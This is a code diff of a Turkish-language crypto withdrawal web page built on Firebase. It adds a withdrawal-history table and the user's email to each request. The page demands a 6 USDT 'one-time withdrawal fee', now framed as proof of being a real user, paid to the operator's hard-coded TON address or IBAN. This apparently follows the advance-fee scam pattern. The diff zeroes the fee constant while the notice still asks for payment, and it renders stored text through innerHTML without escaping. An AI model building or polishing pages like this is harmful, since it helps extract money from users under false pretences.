@@ -101,6 +101,24 @@
     color: #1e2a78;
   }
 
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 30px;
+    font-size: 0.9rem;
+  }
+  table, th, td {
+    border: 1px solid #ddd;
+  }
+  th, td {
+    padding: 10px;
+    text-align: center;
+  }
+  th {
+    background: #4a90e2;
+    color: white;
+  }
+
   @media (max-width: 480px) {
     body {
       padding: 15px;
@@ -114,7 +132,7 @@
 </head>
 <body>
 
-<h2>🏛️Para Çek🏛️</h2>
+<h2>🏛️ Para Çek 🏛️</h2>
 
 <div id="balanceDisplay">Bakiye: Yükleniyor...</div>
 
@@ -133,7 +151,7 @@
 </form>
 
 <div id="paymentNotice" style="display:none;">
-  <p><strong>TEK SEFERLİK Çekim Ücretini Yatırın (6 USDT)</strong></p>
+  <p><strong>TEK SEFERLİK Çekim Ücretini Yatırın Lütfen Gerçek kulanıcı oldugunuzu Doğrulayın Gerekli. (6 USDT)</strong></p>
 
   <label for="paymentOption">Ödeme Seçeneği:</label>
   <select id="paymentOption">
@@ -151,7 +169,20 @@
 
 <div id="message"></div>
 
-<!-- Firebase SDK'ları -->
+<h2>Çekim Taleplerim</h2>
+<table id="userWithdrawalsTable">
+  <thead>
+    <tr>
+      <th>Miktar (USDT)</th>
+      <th>Durum</th>
+      <th>Red Sebebi</th>
+      <th>Talep Tarihi</th>
+    </tr>
+  </thead>
+  <tbody></tbody>
+</table>
+
+<!-- Firebase SDK -->
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
@@ -166,12 +197,13 @@
     messagingSenderId: "773649197313",
     appId: "1:773649197313:web:18da6ed3ee63353c4e9300"
   };
+
   firebase.initializeApp(firebaseConfig);
   const auth = firebase.auth();
   const db = firebase.firestore();
 
-  const minWithdrawAmount = 40;
-  const withdrawFee = 6;
+  const minWithdrawAmount = 0;
+  const withdrawFee = 0;
 
   const myTonAddress = "UQDalUFWerAg7Bo8-NHtX8OgFHRHI8-OvqpqjXjRDZREXzaF";
   const myIbanInfo = {
@@ -190,12 +222,14 @@
   const receiptUpload = document.getElementById("receiptUpload");
   const paidBtn = document.getElementById("paidBtn");
   const messageDiv = document.getElementById("message");
+  const withdrawalsTableBody = document.querySelector("#userWithdrawalsTable tbody");
 
   let currentMethod = null;
   let userTonAddress = "";
   let userBalance = 0;
   let currentWithdrawAmount = 0;
   let currentAddressOrInfo = {};
+  let currentUserEmail = null;
 
   // Kullanıcı auth ve bakiye yükleme
   auth.onAuthStateChanged(async (user) => {
@@ -203,6 +237,7 @@
       window.location.href = "index.html";
       return;
     }
+    currentUserEmail = user.email;
     try {
       const userDoc = await db.collection("balances").doc(user.uid).get();
       if (userDoc.exists) {
@@ -214,6 +249,7 @@
         balanceDisplay.textContent = "Bakiye: 0.0000 USDT";
         withdrawBtn.disabled = true;
       }
+      loadUserWithdrawals(currentUserEmail);
     } catch (e) {
       balanceDisplay.textContent = "Bakiye bilgisi alınamadı.";
       withdrawBtn.disabled = true;
@@ -221,7 +257,7 @@
     }
   });
 
-  // Çekim yöntemi seçimi sonrası dinamik alanlar
+  // Dinamik alanlar ve çekim yöntemi
   methodSelect.addEventListener("change", () => {
     currentMethod = methodSelect.value;
     userTonAddress = "";
@@ -279,7 +315,7 @@
   }
   paymentOption.addEventListener("change", updatePaymentDetails);
 
-  // Para Çek butonuna basınca
+  // Para Çek butonu tıklama
   withdrawBtn.addEventListener("click", () => {
     messageDiv.style.color = "red";
     messageDiv.textContent = "";
@@ -376,8 +412,6 @@
         return;
       }
 
-      // Storage upload KALDIRILDI, sadece Firestore işlem
-
       await db.runTransaction(async (t) => {
         const userBalanceRef = db.collection("balances").doc(user.uid);
         const userDoc = await t.get(userBalanceRef);
@@ -392,11 +426,12 @@
         const withdrawalRef = db.collection("withdrawals").doc();
         t.set(withdrawalRef, {
           userId: user.uid,
+          userEmail: user.email,
           method: currentMethod,
           amount: currentWithdrawAmount,
           addressOrInfo: currentAddressOrInfo,
           paymentOption: paymentOption.value,
-          receiptFileName: receiptUpload.files[0].name, // Sadece dosya adı kaydediliyor, dosya upload edilmiyor
+          receiptFileName: receiptUpload.files[0].name,
           status: "pending",
           createdAt: firebase.firestore.FieldValue.serverTimestamp()
         });
@@ -404,7 +439,7 @@
         t.update(userBalanceRef, { amount: currentBalance - totalDeduct });
       });
 
-      // Güncellenmiş bakiye gösterimi (client tarafı da güncelleniyor)
+      // Güncellenmiş bakiye gösterimi
       userBalance -= (currentWithdrawAmount + withdrawFee);
       balanceDisplay.textContent = `Bakiye: ${userBalance.toFixed(4)} USDT`;
 
@@ -425,6 +460,9 @@
       paymentOption.value = "tonAddress";
       updatePaymentDetails();
 
+      // Yeni talepleri yükle
+      loadUserWithdrawals(currentUserEmail);
+
     } catch (error) {
       messageDiv.style.color = "red";
       messageDiv.textContent = "Hata: " + error.message;
@@ -432,53 +470,25 @@
     }
   });
 
-  // Sayfa yüklendiğinde ödeme detaylarını göster
-  updatePaymentDetails();
-</script>
-
-</body>
-</html>
-
-<!-- Para çekme formunun hemen altına, </form> ve </div> kapanışlarından sonra ekle -->
-<h2>Çekim Taleplerim</h2>
-<table id="userWithdrawalsTable" style="width:100%; border-collapse: collapse; margin-top: 20px;" border="1">
-  <thead>
-    <tr>
-      <th style="padding:8px;">Miktar (USDT)</th>
-      <th style="padding:8px;">Durum</th>
-      <th style="padding:8px;">Red Sebebi</th>
-      <th style="padding:8px;">Talep Tarihi</th>
-    </tr>
-  </thead>
-  <tbody></tbody>
-</table>
-
-<script>
-  // Auth ve Firestore zaten var, ek olarak:
-  auth.onAuthStateChanged(user => {
-    if(user){
-      loadUserWithdrawals(user.email);
-    }
-  });
-
+  // Kullanıcının çekim taleplerini yükle
   function loadUserWithdrawals(email){
+    if (!email) return;
     db.collection("withdrawals")
       .where("userEmail", "==", email)
       .orderBy("createdAt", "desc")
       .get()
       .then(snapshot => {
-        const tbody = document.querySelector("#userWithdrawalsTable tbody");
-        tbody.innerHTML = "";
+        withdrawalsTableBody.innerHTML = "";
         snapshot.forEach(doc => {
           const w = doc.data();
           const date = w.createdAt ? new Date(w.createdAt.seconds * 1000).toLocaleString() : "-";
           const reason = w.reason || "-";
-          tbody.innerHTML += `
+          withdrawalsTableBody.innerHTML += `
             <tr>
-              <td style="padding:8px;">${w.amount.toFixed(4)}</td>
-              <td style="padding:8px; text-transform: capitalize;">${w.status}</td>
-              <td style="padding:8px;">${w.status === "rejected" ? reason : "-"}</td>
-              <td style="padding:8px;">${date}</td>
+              <td>${w.amount.toFixed(4)}</td>
+              <td style="text-transform: capitalize;">${w.status}</td>
+              <td>${w.status === "rejected" ? reason : "-"}</td>
+              <td>${date}</td>
             </tr>
           `;
         });
@@ -487,9 +497,15 @@
         console.error("Çekim talepleri yüklenirken hata:", err);
       });
   }
+
+  // Sayfa yüklendiğinde ödeme detaylarını göster
+  updatePaymentDetails();
+
 </script>
+
 </body>
 </html>
+
 <!-- sayfa içeriğin buraya -->
 
 <!-- Alt Menü -->
